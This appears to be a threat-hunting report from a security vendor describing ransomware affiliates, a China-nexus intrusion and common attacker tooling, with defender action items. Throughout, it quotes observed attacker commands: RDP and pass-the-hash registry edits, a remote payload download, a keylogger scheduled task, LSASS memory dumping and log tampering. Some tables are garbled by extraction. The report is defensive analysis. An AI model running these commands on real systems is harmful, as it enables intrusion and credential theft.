registry:\n\nC:\\Windows\\system32\\reg.exe\nADD “HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\nServer” /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\nOverWatch observed the affiliate leveraging native utilities to execute\n\nvarious host and network reconnaissance commands, including testing\n\nconnectivity to multiple external IP addresses. Additionally, the affiliate\n\ninspected a significant number of likely sensitive files relating to financial\n\nor credential information.\n\nDuring this intrusion, the affiliate once again downloaded and\n\nexecuted multiple tools to conduct operations, this time selecting\n\nAdvanced IP scanner, WinSCP and PuTTY as well as delivering and\n\nattempting to execute a StealBit binary.\n\nUnlike the previous intrusions, the eCrime affiliate’s emphasis was\n\nsquarely on data theft and extortion. This activity generated a different\n\nset of TTPs that demand hunters remain vigilant. Rather than creating\n\nany obvious accounts, the affiliate used legitimate access and system\n\n|Col1|Col2|\n|---|---|\n|CCESS gains ccess h valid ounts||\n||LATERAL MO AND EXECUT Affiliate leverages between in hosts and enables PowerShe remoting f command execution DISCOVERY Affiliate co extensive discovery testing hos network connectivi hunting for document containing informatio|\n|ASION difies stry to bound ssions ternal urces||\n|ATION ffiliate pts to e data ustom ealBit lware, P and uTTY||\n\n\n-----\n\nTo proactively hunt for this type of intrusion, defenders should\n\nwatch for:\n\nManual changes to the registry, specifically to RDP settings\n\nExcessive testing of connectivity to external domains\n\nNewly installed tooling for data transfer\n\nAbnormal access to sensitive files, such as financial or\n\ncredential-related information\n\n###### Action Items for Defenders\n\nThere is no one-size-fits-all model when it comes to how ransomware affiliates conduct intrusions, nor is there a single silver\n\nbullet for organizations to defend themselves against every intrusion. However, by looking at how intrusions overlap, it is\n\npossible to identify areas of focus for security and hunting teams.\n\nPrioritize security controls that help to secure and audit the use of remote access services and RDP. Each intrusion\n\nscenario featured the exploitation of remote access services and the use of RDP and some form of valid account. Prioritizing\n\nsecurity controls in these areas, such as implementing multifactor authentication (MFA), would help in many cases. When it\n\ncomes to hunting for precursors of ransomware activity, identifying lateral movement between critical assets such as domain\n\ncontrollers and backup servers is also crucial.\n\nActivate a strong, flexible identity security solution. Continuous human-driven threat hunting that looks for the patterns\n\nassociated with post-exploitation behaviors is effective at uncovering adversaries leveraging valid accounts to carry out\n\ntheir activities. It is also crucial to implement technologies that can assist with privileged account management and account\n\nauditing (such as CrowdStrike Falcon Identity Threat Detection).[12]\n\nPartner with OverWatch to get the information and tools necessary to hunt for malicious activity within your own\n\nenvironment. The RaaS affiliate model and constantly shifting trends in the eCrime ecosystem create a moving target for\n\nproactive threat hunters. Partnering with OverWatch provides organizations with access to the experience and expertise\n\nof our threat hunting teams, helping to keep abreast of the changing landscape and ever-changing adversary behaviors.\n\nOverWatch sees numerous intrusion attempts daily. The scale of this visibility means that OverWatch can rapidly spot\n\nchanges in affiliate tradecraft.\n\n\n-----\n\n###### Tooling Deep Dive: Emerging, Trending and Mainstay Tools\n\nTools abound in cybersecurity. Recently there has been a trend of\n\nadversaries leveraging native tooling to evade detection, but there are\n\nlimitations to what can be quickly accomplished using these built-in utilities.\n\nBringing in certain tools broadens the options available to an adversary and\n\ncan shorten the time required to accomplish an objective. The following\n\nsection overviews the tools OverWatch found noteworthy in the past year.\n\n###### Emerging Tools\n\nOver the past year, countless tools were written and distributed across the\n\ninformation security and adversary communities. The majority of these tools\n\nwent unnoticed and largely unused, but a handful have been adopted and\n\nOverWatch is now seeing them used in active intrusions. Studying these\n\ntools gives threat hunters clues about the direction of adversary activity.\n\n\n-----\n\nfscan.exe -h 10.227.156.0/24 -nopoc -np -p 80,135,139,443,445,1433,3306,5432,6379,7001,8000\n,8080,3389\n\n\n###### fscan Discovery\n\nDeveloped in the first half of 2021, fscan is an open-source Windows tool that adversaries started picking up and using heavily later\nin the year. Fundamentally, this tool is a vulnerability scanner, but it can also be used to query machines for advanced fingerprinting,\nestablishing a proxy and exploiting machines via modification of public keys and SSH commands.\n\nIn the Wild\nOnce an adversary has gained initial access into a system, they typically begin running discovery commands to learn more about\nthe environment to plan their next steps. This lightweight tool is written in Go programming language, allowing for quick deployment\nto a compromised system and ease in scanning internal hosts as a means for establishing a deeper foothold in the network.\n\nOverWatch Observations\nOverWatch commonly observes the fscan binary renamed for the purpose of evading detection.\n\nLuckily, some of the command options are unique enough to easily find the majority of these renamed binaries. Commands running\nwith one of the following options are likely to be a renamed fscan binary:\n\n`-nopoc` - Disable web vuln scan\n\n`-np` - Disable Ping\n\nAs seen in these command line examples:\n\n./exp1orer6 -h 10.68.59.42 -user root -pwd [REDACTED] -nopoc -c ping -c 2 [REDACTED]\n\n./fs -h 192.168.152.1/24 -np -nopoc\n\nfscan.exe -h 10.227.156.0/24 -nopoc -np -p 80,135,139,443,445,1433,3306,5432,6379,7001,8000\n\n\n-----\n\n###### IceApple Defense Evasion, Credential Access, Exfiltration\n\nDiscovered by OverWatch,[13] IceApple is a sophisticated .NET-based post-exploitation framework that has been seen targeting IIS\nservers. The framework is modular, allowing a range of functionality. The emergence of new and evolving IceApple modules over\nthe past year indicates that this framework remains under active development.\n\nReflectively loading .NET assemblies, which involves executing the assembly directly within the memory of a process, can be a\npowerful and potentially stealthy way for adversaries to pursue their mission objectives.\n\nIn the Wild\nAdversaries are using IceApple to gain further objectives after they have already established a foothold in an environment.\nThis framework is incredibly hard to detect because it leverages reflectively loaded .NET assemblies and resides in memory,\nmaintaining a low forensic footprint. Because IceApple is loaded into existing processes, defenders do not see a malicious or\nuncommon process running — they will only see a legitimate application like a web server connecting out to a suspicious IP.\n\nThere are 18 modules that can be used within the IceApple framework. Below are examples of the more impactful modules:\n\n###### + Writing data to a file\n\n + Deleting files and directories\n\n + Retrieving IIS server variables\n\n + Dumping credentials stored in registry keys on the infected host or a remote host\n\n + Executing queries against Active Directory “Normal” exfiltrating of files\n\n + Performing special exfiltration of files — including large files and several files at a time — via a separate HTTP listener\n\nOverWatch Observations\n\nOverWatch regularly sees adversaries use .NET assemblies as a way to load additional functionality post-exploitation. As such,\nOverWatch threat hunters have been actively developing detections for reflective .NET assembly loads.\n\nIn late 2021, one of OverWatch’s in-development detections for reflective .NET assembly loads triggered on a Microsoft Exchange\nOWA server belonging to a customer that had recently started a trial of the Falcon platform. Eagle-eyed threat hunters identified\nanomalies in the assembly files and quickly notified the victim organization.\n\nOverWatch hunters were able to leverage their understanding of standard application behaviors to identify these anomalies:\n\n###### + IIS does not reflectively load its generated temporary .NET assemblies from byte arrays.\n\n + Microsoft Exchange does not reflectively load its .NET assemblies from byte arrays.\n\n + The last eight characters of IIS temporary file names are randomly generated; however, the same four .NET assembly names\n\n\n13 For a detailed discussion of IceApple and the functionality of its modules see OverWatch’s research paper on the topic\n\n\n-----\n\nSweet Potato is a collection of scripts that can be staged and downloaded from any adversary-controlled domain or IP. OverWatch\noften sees the binary renamed as it’s downloaded to the victim host, and as a result, hash identification is useful for locating Potato\nbinaries.\n\nExample of a renamed Potato binary:\n\npowershell Invoke-WebRequest -Uri\n\"http://[REDACTED]/kumpir.exe\" -OutFile\n\"c:\\users\\public\\kumpir.exe\"\n\n\n###### Trending Tools\n\nIn many cases, it takes time for adversaries to adopt new techniques\n\nand tools into their operations. The OverWatch team is interested\n\nwhen tools have been around for years but appear to be increasing in\n\npopularity. This gives hunters an idea of where things are trending and\n\nwhat adversaries are finding most effective.\n\n###### Sweet Potato\n (and Other Potato Variations) Privilege Escalation\n\nIn 2016, a privilege escalation vulnerability known as “Hot Potato” was discovered within the Windows operating system. The\nfundamental concept is to force a system to authenticate and capture the security token. Over time, variations of this technique\nwere created with similar names — such as “Juicy Potato,” “Lonely Potato” and “Rogue Potato” — but relied on the same underlying\nmethod of capturing credentials in transit. More recently in 2020, a script called “Sweet Potato” was written to bundle multiple\nPotato exploits, which can be run standalone or through attack frameworks such as PowerShell Empire and Cobalt Strike.\n\nOverview of method:\n\n1. Forces NT AUTHORITY/SYSTEM to authenticate via NTLM\n\n2. Captures authentication attempt to acquire security token\n\n3. Impersonates if the account will allow it (the account must have SeImpersonatePrivilege rights)\n\nIn the Wild\nDespite variations of this tool dating back to 2016, it continues to find a place in adversary toolkits due to consistent innovation and\nease of use. As with so many other exploitation tools, a push to “one-click” solutions lowers the barrier to entry for adversaries and\ncan make it easier for adversary groups to standardize procedures.\n\nOverWatch Observations\n\nSweet Potato is a collection of scripts that can be staged and downloaded from any adversary-controlled domain or IP. OverWatch\noften sees the binary renamed as it’s downloaded to the victim host, and as a result, hash identification is useful for locating Potato\nbinaries.\n\n\n-----\n\n###### ngrok, fatedier and Other Reverse Proxy Tooling Command and Control and Exfiltration\n\nReverse proxy tools like ngrok, fatedier and others are used to make internal hosts accessible from the public internet. Typically\nwe think about exposing web servers to the public internet, but these tools can be applied to any port. When they are used by the\nwrong actors, you can find services and hosts open to external connections when they should not be.\n\nIn the Wild\nAdversaries have been leveraging these tools to make other services like RDP or SSH available through the open web as a form of\npersistence. They create scheduled tasks or services to run tools like ngrok periodically to ensure they can still access the host if\nthe initial access vector is cut off.\n\nOverWatch Observations\n\nngrok specifically is a service that requires configuration before using the tool. To set up this tool to make a host available at a\nspecific ngrok domain, an authentication token must be either added to the configuration using command such as the following:\n\nngrok.exe config add-authtoken [AUTH TOKEN REACTED]\n\nOr used each time ngrok is run:\n\nssas.exe authtoken [AUTH TOKEN REDACTED]\n\nThe authtoken string is a strong indicator of the use of this tool even if the binary has been renamed.\n\n\n-----\n\n###### Mainstay Tools\n\nThese tools are not new or increasing in use — they have been\n\nconstantly used by attackers over the last few years, and OverWatch\n\ncontinues to see them in intrusions. While these may not be the new\n\nshiny items on the scene, it is important to remember that adversaries\n\nwould not continue to use them if they did not find success.\n\n###### Remote Access Tooling\n Command and Control\n\nThere is a well-established and legitimate business need for remote access software. Numerous open-source and commercial\napplications have been written to fulfill this need. IT operations use a variety of these applications depending on their budget and\npreferences. Adversaries are quick to take advantage of this by leveraging applications such as VNC, AnyDesk, Atera, TeamViewer\nand more to fulfill their mission objectives.\n\nIn the Wild\nAdversaries are leveraging legitimate remote access software because it is signed and trusted by operating systems. It is much\nmore difficult to stop legitimate software from being installed because it will not be blocked by any of the defensive controls on\nthe lookout for hacking tools. Once the software is installed, they use it to gain persistence in the event that their primary mode of\naccess is denied. These tools also have the capability to send files directly to a victim host from an attacker controlled machine.\nThis allows for stealthy transfer of additional malicious files.\n\nOverWatch Observations\nThese tools are legitimate applications and are hosted on the company’s websites. OverWatch observes them being downloaded\nfrom the official websites in the same way a typical user would acquire the software. Once the executable is downloaded, it is\ninstalled through the standard MSI method for applications. In other cases, it can be installed as a service or built into a scheduled\ntask for persistence.\n\npowershell -c (New-Object Net.WebClient).DownloadFile('hxxp://download.anydesk[.]com/\nAnyDesk.msi', 'AnyDesk.msi')\nC:\\Program Files (x86)\\TeamViewer\\TeamViewer_Service.exe\" -install\n\nC:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe\" --service\n\nService Installation\nThis PowerShell command is reaching out to the AnyDesk site to pull down a legitimate executable.\n\n\n-----\n\nOverWatch Observations\nThis tool is downloaded as a single executable and launches a graphical user interface for the user. This makes the tool easy to\nobfuscate by renaming the binary and difficult to uncover because it does not use command line arguments.\n\n\n###### Cobalt Strike\n Command and Control\n\nCobalt Strike is an extremely powerful and robust penetration-testing tool that has been adopted by legitimate adversaries. It is\nwidely used by both eCrime and targeted intrusion adversaries that leverage both legitimate licenses and pirated copies of the\nsoftware.\n\nIn the Wild\nAdversaries continue to leverage the tool due to its broad feature set and ability to generate command-and-control (C2) implants\nthat are difficult to detect. Cobalt Strike is the gold standard for adversary simulations and continues to receive regular updates to\ncombat new defenses and detection methods.\n\nOverWatch Observations\nCobalt Strike can be difficult to detect because of its ability to generate new implants to bypass defensive controls. For implants\nto work correctly, they must beacon out to a control server — this communication is one of the ways that OverWatch detects\nthese implants. Another method for detecting the implant is to find installation/creation of the implant on the target machine.\n\nA PowerShell script creating a Cobalt Strike Beacon:\n\n\"C:\\Windows\\System32\\notepad.exe\" \"\\\\tsclient\\Z\\New Text Document.ps1\"\n\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe\" \"\\\\tsclient\\Z\\New Text\nDocument.ps1\"\n\n###### GMER\n Defense Evasion\n\nGMER was originally designed to be a defensive tool for the purpose of detecting and removing rootkits. Due to the way it interacts\nwith the Windows operating system, it has been adopted by adversaries to bypass security features.\n\nIn the Wild\nAdversaries are bundling GMER alongside other discovery and defense evasion tools to quickly and efficiently push out encryption\nsoftware to lock down environments. The tool can be downloaded as a file with a random string to evade Windows blocking based\non binary name.\n\nOverWatch Observations\n\n\n-----\n\n###### OverWatch and Falcon Complete Team Up to Deliver Immediate Time- to-Value\n\nOverWatch continuous threat hunting is an integral part of the CrowdStrike Falcon\n\nComplete™ managed detection and response service. OverWatch threat hunters\n\ncollaborate closely with their counterparts in Falcon Complete, exchanging information\n\nabout their respective discoveries to facilitate both deeper investigation and rapid\n\nremediation. It is not uncommon for new customers to experience the power of this\n\npartnership much earlier than they anticipated.\n\nIn late 2021, shortly after the rollout of the Falcon sensor across a new environment,\n\nOverWatch hunting uncovered evidence of a pre-existing intrusion on a Microsoft\n\nExchange Server. The server was running a w3wp.exe (IIS worker) process with\n\nthe MSExchangeAutodiscoverAppPool application pool. Interestingly, the server\n\nconnected to another host on the network over Server Message Block (SMB)\n\nprotocol. While OverWatch only had limited data at this point, threat hunters were\n\nable to identify the activity as rare within the global OverWatch telemetry — which\n\nmade it immediately suspicious.\n\nFurther activity on the compromised server revealed the presence of a low footprint\n\nintrusion, likely conducted by a state-nexus adversary. This activity included the presence\n\nof suspicious files indicative of likely web shell activity, including .aspx files and a temporary\n\nVisual Basic .NET file — unique within the OverWatch dataset. Upon further investigation,\n\nevidence was discovered of an account set up with Application Impersonation privileges,\n\nwhich is particularly concerning as this enables applications or users to impersonate\n\nother users in an organization to perform tasks on behalf of the user.[14] This can be used to\n\nmaliciously collect email data, as was likely the case in this particular incident.\n\n\n-----\n\nOverWatch immediately notified the customer of the suspicious activity the\n\nhunters had uncovered. This led the new customer to upgrade their subscription\n\nto the Falcon Complete service. Falcon Complete analysts were then able to take\n\nimmediate action to stop and remediate this attack on behalf of the customer. With\n\nthe victim organization’s approval, Falcon Complete analysts leveraged the Falcon\n\nReal Time Response (RTR) capability to investigate the Exchange Server logs —\n\nfinding further evidence that the initial infection was the exploitation of an Exchange\n\nvulnerability. Falcon RTR also provided analysts the ability to surgically remove the\n\nweb shell files, which were identified in the following directories:\n\nC:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\\nAutodiscover\\\n\nC:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\\nHttpProxy\\owa\\auth\\Current\\scripts\\premium\\\n\nFalcon Complete also provided the customer with recommendations to further\n\nharden the environment. This included patching Exchange on the vulnerable server,\n\nperforming a domain-wide password reset, ensuring multifactor authentication is\n\nenabled on all email accounts and remote admin access services, and deploying the\n\nFalcon sensor across the environment.\n\nNo organization plans to test its security services against a hands-on state-\n\nnexus adversary. However, for this organization, the move to CrowdStrike\n\nproved timely — Falcon OverWatch and Falcon Complete worked together to\n\nidentify and remediate a stealthy intrusion that had previously gone undetected.\n\nThe vigilance and expertise of OverWatch and Falcon Complete provided\n\nthis organization with immediate time-to-value and confidence that they had\n\nentrusted their environment to safe hands.\n\n\n-----\n\nOverWatch threat hunters are regularly exposed to the cutting edge\n\nof adversary tradecraft — and this past year was no exception.\n\nAdversaries are continuing to evolve their tradecraft as they strive\n\nto bypass even the most sophisticated technology-based defense\n\nsystems.\n\nOverWatch threat hunters are developing their hunting operations\n\nalongside these changes in adversarial behavior — meeting the\n\nadversary exactly where they are, successfully unearthing even the\n\nmost novel malicious activity.\n\nThe following section details some of the most interesting adversarial\n\ntradecraft OverWatch has discovered over the past year.

This\n\ntrend continued into the first half of 2022, when OverWatch uncovered\n\na sophisticated intrusion campaign against a global technology and\n\nmanufacturing company.\n\nThe company was evaluating the Falcon platform; during the\n\nevaluation, OverWatch discovered signs of malicious activity\n\noriginating from hosts that had not yet been included in the evaluation\n\nand did not have the Falcon sensor deployed. To enable OverWatch\n\nto investigate the full extent of the activity, the prospect deployed the\n\nsensor across additional hosts, allowing OverWatch to discover the\n\nextent of the intrusion, which predated the Falcon sensor deployment.\n\n\n-----\n\nOverWatch found evidence of multiple actors present in\n\nthe victim’s network, including activity attributed with high\n\nconfidence to the China-nexus threat actor AQUATIC PANDA\n\n— the focus of this case study.\n\nThe malicious interactive activity was discovered as part of\n\nOverWatch’s 24/7/365 human-driven threat hunting operations\n\nand was consistent with targeted intrusion operations.\n\nAQUATIC PANDA was tracked using several distinct TTPs that\n\nwere consistent with a well-established actor. Demonstrating\n\nthe actor’s cross-platform proficiency, the malicious activity\n\nextended across both Windows and Linux hosts.

The actor was found to be operating in possession\n\nof numerous sets of valid credentials and had multiple methods of persistent access at their\n\ndisposal, having successfully deployed a selection of implants across a collection of hosts.\n\nThe use of implants is a favored way for targeted intrusion adversaries to maintain access\n\nto a network, as is the abuse of legitimate signed executables to facilitate their execution.\n\nAQUATIC PANDA used the legitimate Windows Security Health Service executable\n\nSecurityHealthService.exe to load a malicious DLL before creating a new service with\n\nthe display name “Windows User Service” in a deliberate attempt to have it blend in as an\n\ninnocuous operating system service, as shown in the below command line.\n\nsc create WpnUserService_10e316 binpath= “cmd.exe /c start\nC:\\Programdata\\Microsoft\\Crypto\\Keys\\SecurityHealthService.exe”\nstart= auto obj= localsystem displayname= “Windows User Service”\n\nSimilar activity was also observed on a neighboring host, where the actor leveraged a\n\nremotely created scheduled task to install the same implant.\n\nImplant deployment activity continued on Linux hosts, where the actor established\n\nan interactive session on one host via SSH.[15] Operating as the root user, the actor\n\nexecuted a shell script resulting in the installation of the Linux version of Winnti. The\n\ninstallation comprised two components, a Winnti executable (/lib/libxselinux) and\n\na second executable, likely an Azazel sample (/lib/libxselinux.so). Additionally,\n\nthe aforementioned script attempted to modify ld.so.preload in a likely attempt to\n\npersist the backdoor using the dynamic linker hijacking technique.[16] The execution of the\n\nbackdoor was followed by a network connection to an external IP address. This IP address\n\nhad previously been identified by CrowdStrike Intelligence as likely C2 infrastructure\n\nassociated with ShadowPad, a malware family commonly associated with China-nexus\n\ntargeted intrusion adversaries.\n\nThe actor attempted to cover their tracks by deleting the Winnti install script and clearing\n\nSSH authentication logs by using rm to delete var/log/secure. In an additional step, the\n\nactor used the last command to view information about recently logged-in users before\n\nmanipulating the wtmp file to remove selected entries to conceal their activity.\n\n15 [https://attack.mitre.org/techniques/T1021/004/](https://attack.mitre.org/techniques/T1021/004/)\n\n\n-----\n\n###### PERSISTENCE\n\n Featured Technique\n Dynamic Linker Hijacking[17]\n\nHow This Technique Works: After gaining initial access, adversaries typically turn their\n\nfocus to establishing a foothold and taking steps to ensure and maintain persistent access.\n\nHijacking the dynamic linker on a Linux-based system provides the adversary with a way\n\nto load malicious code by hijacking the environment variables used by the dynamic linker\n\nto load shared libraries. The libraries defined in the environment variables take precedence\n\nover system libraries in terms of load order, which presents an opportunity for an adversary\n\nto tamper with either LD_PRELOAD or the /etc/ld.so.preload file, configuring it to point\n\nto a malicious library in place of the legitimate library.\n\nHow Adversaries Leverage This Technique: The Dynamic Linker Hijacking technique\n\nallows an adversary to load arbitrary code upon execution of the linked legitimate process.\n\nThis in turn enables the adversary to subvert security controls by effectively hiding the\n\nexecution of the malicious payload under the legitimate process.\n\nWhat Threat Hunting Delivers: Identifying and disrupting adversary use of the Dynamic\n\nLinker Hijacking technique presents a unique challenge for defenders relying solely on\n\ntechnology-based controls, due to the injection of malicious code into a legitimate process.\n\nHuman-led threat hunting provides defenders with the timely discovery of behaviors and\n\nactivities associated with the use of this persistence technique, including proactively\n\nsearching for attempts to modify the /etc/ld.so.preload file, and the use of the chattr\n\ncommand to either set or unset Linux file attributes — specifically, the +i attribute, which\n\nsets a file as immutable and therefore unable to be modified.\n\n17 For more information on this technique, see the MITRE website:\n\n\n-----\n\n###### Credentials in the Crosshairs\n\nAlthough the actor already controlled many valid user accounts, they relentlessly pursued\n\nadditional credentials. The actor used several distinct techniques for gathering and\n\nextracting credential-related information across a collection of Windows and Linux hosts.\n\nIn one such instance, the actor used reg.exe to modify the Windows registry, adding a new\n\nregistry key to enable a feature known as RestrictedAdmin mode, shown in the command\n\nline below. This feature was originally introduced by Microsoft to prevent the transmission\n\nof reusable credentials to the remote systems when connecting via RDP. This in turn\n\nprevents credentials being harvested during the initial connection process if the remote\n\nserver has been compromised to mitigate against “pass the hash”[18] attacks.\n\nREG ADD “HKLM\\System\\CurrentControlSet\\Control\\Lsa” /v\n\nDisableRestrictedAdmin /t REG_DWORD /d 00000000 /f\n\nInterestingly, this registry feature introduces the ability to pass the hash to RDP. In this case,\n\nit opens the door for the actor to be able to authenticate via RDP using a valid account\n\nname and hash without requiring an unhashed or cleartext password.\n\nThe abuse of signed Microsoft binaries is another technique that has cemented itself as a\n\nmainstay as actors seek out alternate mechanisms to facilitate their malicious operations\n\nwhile attempting to subvert security controls. Rundll32[19 ]is among the most commonly\n\nabused signed system binaries. In this intrusion, the actor used Rundll32 to proxy the\n\nexecution of a malicious DLL file identified by CrowdStrike Intelligence as a keylogging[20]\n\nbinary.The keylogging binary was executed by way of a scheduled task,[21] which was\n\nconfigured to run on logon under the context of a valid user account, as shown in the below\n\ncommand line example.\n\nschtasks /create /TN \\Microsoft\\Windows\\WindowsUpdate\\WindowsKeys /TR\n“C:\\Windows\\system32\\Rundll32.exe\nc:\\users\\[REDACTED]\\AppData\\Local\\Microsoft\\Windows\\0\\keys.\ndll,Update” /SC ONLOGON /RU [REDACTED]\n\nThe resulting output of the keylogger execution was subsequently written to the directory\n\nC:\\Users\\Public\\Microsoft\\System\\Update likely in preparation for exfiltration.\n\n18 For more information on this technique, see the MITRE website:\nhttps://attack.mitre.org/techniques/T1550/002/.\n\n19 For more information on this technique, see the MITRE website:\nhttps://attack.mitre.org/techniques/T1218/011/.\n\n20 For more information on this technique, see the MITRE website:\n[https://attack.mitre.org/techniques/T1056/001/.](https://attack.mitre.org/techniques/T1056/001/)\n\n21 For more information on this technique, see the MITRE website:\n\n\n-----\n\nContinuing their credential harvesting efforts, the actor used a renamed instance of\n\ncreatedump.exe, the Microsoft .NET Runtime Crash Dump Generator, to dump the\n\ncontents of the LSASS[22] process memory with the resulting output file written to a .dmp file\n\nvia the execution of the following command:\n\ncdump.exe -u -f tempdmp.dmp 192\n\nAdditionally, the actor used the Windows Task Manager to dump the contents of LSASS\n\nprocess memory before using the open source file archiving utility[23] 7-Zip to compress the\n\noutput file, again in readiness for a likely exfiltration attempt:\n\n“C:\\Program Files\\7-Zip\\7zG.exe” a -i#7zMap5454:110:7zEvent5987 -t7z -sae\n\n-- “C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\3\\lsass.7z”\n\n###### Pivoting Without Obstruction\n\nThe deeply entrenched nature of AQUATIC PANDA’s access into the victim organization’s\n\nnetwork along with their possession of privileged domain level credentials allowed them\n\nto move freely between hosts without obstruction, leveraging a kit of remote services\n\nincluding RDP, SSH and Windows Admin Shares[24] to facilitate lateral movement in pursuit\n\nof their actions on objectives.\n\n###### Laying the Groundwork for Exfiltration\n\nAQUATIC PANDA’s data collection operations included the gathering of sensitive files,\n\ncredential-related information and log data, culminating in the archiving of this data likely as\n\na precursor to exfiltration attempts.\n\nAs part of these collection operations, the actor showed an interest in Windows security\n\nevent log data and was observed using the Microsoft wevtutil utility to extract these events\n\ninto an .evtx output file:\n\nwevtutil epl Security c:\\programdata\\1.evtx “/q:*[System [TimeCreated[@\nSystemTime >’[REDACTED]’]]]”\n\nThey then used rar.exe to archive the collected event entries ready for exfiltration.\n\nC:\\programdata\\Rar.exe a -ag -m3 c:\\programdata\\date.rar C:\\\n\nprogramdata\\1.evtx\n\n22 For more information on this technique, see the MITRE website:\n[https://attack.mitre.org/techniques/T1003/001/.](https://attack.mitre.org/techniques/T1003/001/)\n\n23 For more information on this technique, see the MITRE website:\n[https://attack.mitre.org/techniques/T1560/001/.](https://attack.mitre.org/techniques/T1560/001/)\n\n24 For more information on this technique, see the MITRE website:\n\n\n-----\n\n###### Action Items for Defenders\n\nThroughout the last year, the ongoing abuse of privileged user accounts and exploitation of\n\nvulnerable web applications and services have remained a prominent intrusion theme, and\n\none that shows no signs of abating as organizations across all verticals continue to grapple\n\nwith basic security hygiene and patch management. Additionally, the abuse of legitimate\n\nsigned binaries as a means to proxy the execution of malicious files along with the use of\n\nsophisticated and stealthy techniques including Dynamic Linker Hijacking continue to\n\npresent unique challenges to defenders who remain dependent on automated technology\n\ncontrols alone.\n\nIt is paramount that organizations remember the basics with respect to security\n\nhygiene. This includes deploying a robust patch management program and ensuring\n\nstrong user account control and privileged access management to help mitigate the\n\npotential impact of compromised credentials.\n\nCombining technology, people and process is key. When it comes to reliably defending\n\nagainst increasingly capable adversaries, this trifecta provides the most comprehensive\n\nand rapid detections for sophisticated and stealthy intrusions.\n\nIn this case, AQUATIC PANDA’s operations were systematically unraveled as a result of\n\nFalcon OverWatch’s 24/7 human-driven threat hunting operations. This comes despite\n\nAQUATIC PANDA establishing a deep level of access into the victim organization’s network\n\nand having a large number of privileged credentials in their control; making diligent efforts\n\nto operate covertly; and having an expansive number of persistent entry points into the\n\nnetwork. OverWatch bridged the gap for the victim organization in this case, arming the\n\ndefenders with the vital visibility and timely actionable intelligence required to take action\n\nand disrupt the stealthiest of tradecraft.\n\n\n###### OverWatch\n Customers\n\n The extended version of this report, available through the Falcon console exclusively, includes a complete summary of all of the tactics, techniques and sub-techniques employed as part of this particular intrusion campaign, based on the MITRE ATT&CK Enterprise\n\n\n-----\n\n###### Healthcare Sector Finds Itself in the Crosshairs of eCrime Ransomware Affiliates\n\nThe volume of attempted interactive intrusions against the healthcare\n\nsector has doubled year-over-year. A significant majority of these\n\nintrusions have been attributed to eCrime adversaries. Compared to other\n\nsectors, healthcare has seen one of the largest increases in interactive\n\nadversary activity. This increase was particularly notable in the second\n\nquarter of 2022 when OverWatch tracked more than three times the\n\nnumber of interactive intrusions than were observed in the same quarter\n\nthe previous year, and healthcare overtook telecommunications as the\n\nsecond most frequently targeted industry vertical.\n\nOverWatch continues to see a proliferation of interactive eCrime activity\n\n[leveraging affiliate models to effectively rent access to ransomware](https://www.crowdstrike.com/cybersecurity-101/ransomware/ransomware-as-a-service-raas/)\n\nplatforms. This lowers the barrier to entry and enables eCrime groups\n\nto perform big game hunting attacks (BGH) without needing to invest\n\nthe time and resources to develop the tooling or capabilities in-house.\n\nAlthough affiliate models appeal to smaller or less sophisticated eCrime\n\ngroups, affiliates can also be highly skilled adversaries, and organizations\n\nwould be unwise to dismiss the potential risk to their environments. It is\n\ntherefore important that defenders can recognize the TTPs that eCrime\n\naffiliates leverage in these types of intrusions. The following case studies\n\nhighlight two recent intrusions in which OverWatch threat hunters\n\ncaught eCrime affiliates operating within healthcare organizations. The\n\nfirst case study is characteristic of a Phobos ransomware intrusion and\n\nthe second of an ALPHV intrusion. They both provide useful insights into\n\nwhat defenders should be alert to in their environments.\n\n\n-----\n\n###### INITIAL ACCESS\n\nAffiliate gains access\nusing a brute-force\nattack against a local\nadministrator account\n\n###### DEFENSE EVASION\n\nAffiliate executes a\nbatch script to\nlaunch a series of\nregistry changes to\nimpair system\ndefenses\n\n\n###### LATERAL MOVEMENT\nAffiliate uses RDP\nservices to extend\ntheir foothold to\nadditional hosts,\nquickly gaining\naccess across\nmultiple Windows\nservers\n\n###### CREDENTIAL ACCESS\n\nAffiliate uses\nMimikatz and\nWebBrowserPassView\nin an attempt to gain\naccess to additional\nuser account\ncredentials — this is\nblocked by the Falcon\nplatform\n\n\n###### OverWatch Identifies Interactive Phobos Affiliate\n\nOverWatch recently identified the early stages of an attempted\n\nransomware intrusion against a healthcare organization. A Phobos\n\naffiliate was caught after they used a brute-force attack to gain initial\n\naccess under a local administrator account. They proceeded to use\n\nRDP services to extend their foothold to additional hosts, quickly\n\ngaining access across multiple Windows servers.\n\nAt this stage, OverWatch observed various tools being downloaded\n\nto the non-standard locations listed below. These tools were\n\nrepresentative of tooling that OverWatch regularly observes prior to\n\nransomware deployment, including commodity scanning software,\n\nfile tampering tools, tools for enumeration and credential harvesting\n\nobjectives, and finally a Phobos ransomware binary.\n\nC:\\PerfLogs\\\n###### +\n\nC:\\Users\\[REDACTED]\\Desktop\\\n###### +\n\nC:\\Users\\[REDACTED]\\Music\\\n###### +\n\nThe OverWatch team notified the customer and continued pursuing\n\nthe adversary. The adversary’s next step was to execute a batch script\n\nthat launched a series of registry changes to impair system defenses.\n\nThese registry changes performed a range of actions to both disable\n\nsecurity controls and tamper with security configurations to bypass\n\ndefensive controls and enabling credential harvesting.\n\nThe adversary then used Mimikatz and WebBrowserPassView in an\n\nattempt to gain access to additional user account credentials, which\n\nwas blocked by the Falcon platform. The victim organization in this\n\ncase was also subscribed to Falcon Complete managed detection and\n\nresponse. By this point, Falcon Complete was acting on OverWatch’s\n\ndetections and contained the affected host before the ransomware\n\ncould be executed. The Falcon Complete team then worked with\n\nthe customer to remove the threat from the environment and\n\nrecommended follow-up actions.\n\n|Col1|LATERA Affiliat servic their fo additio quickly acces multipl server CREDEN Affiliat Mimik WebB in an at acces user a crede blocke platfor|\n|---|---|\n|ACCESS ccess -force a local ccount||\n|VASION cutes a cript to ries of ges to ystem fenses||\n\n\n###### OverWatch\n Customers\n\n The extended version of this report, available through the Falcon console exclusively, includes a complete annotated table of the registry changes\n (see Appendix B). \n\n\n-----\n\nThis combination of people, process and technology is a strong force multiplier that can\n\nhelp businesses in the fight against adversaries such as eCrime affiliates. In this intrusion,\n\nhuman hunters were on hand to unearth the interactive tradecraft, the SEARCH hunting\n\nmethodology[25] was followed 